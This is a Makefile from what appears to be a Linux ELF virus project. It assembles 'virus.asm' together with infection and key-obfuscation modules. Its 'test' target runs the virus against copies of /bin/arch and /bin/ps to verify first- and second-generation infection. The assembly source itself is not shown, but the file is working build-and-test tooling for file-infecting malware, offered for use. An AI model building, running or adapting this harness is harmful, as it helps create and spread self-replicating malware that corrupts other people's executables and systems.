# By using this file, you agree to the terms and conditions set
# forth in the COPYING file which can be found at the top level
# of this distribution.
#
# Misc options: -DUSE_RDTSC
#
# To build all variants see mk/
#
AFLAGS=-f elf -O2 -w+orphan-labels

all:
	@echo
	@echo "Use Makefile in mk/ directory to build all variants"
	@echo
	@echo "or make target 'single' here for debug..."
	@echo
	@echo

single: virus test

virus: virus.asm mk_key.asm obskey.asm infect.asm
	nasm $(AFLAGS) $< -o virus.o  
	ld virus.o -o $@
	@strings virus|grep '^\*\*\*'

test:
	@cp -f /bin/arch .
# first generation
	@./virus
	@./arch
# second generation
	@cp -f /bin/ps .
	@./arch
	@./ps w

clean:
	-@rm -f arch ps virus virus.o

.PHONY: all test clean
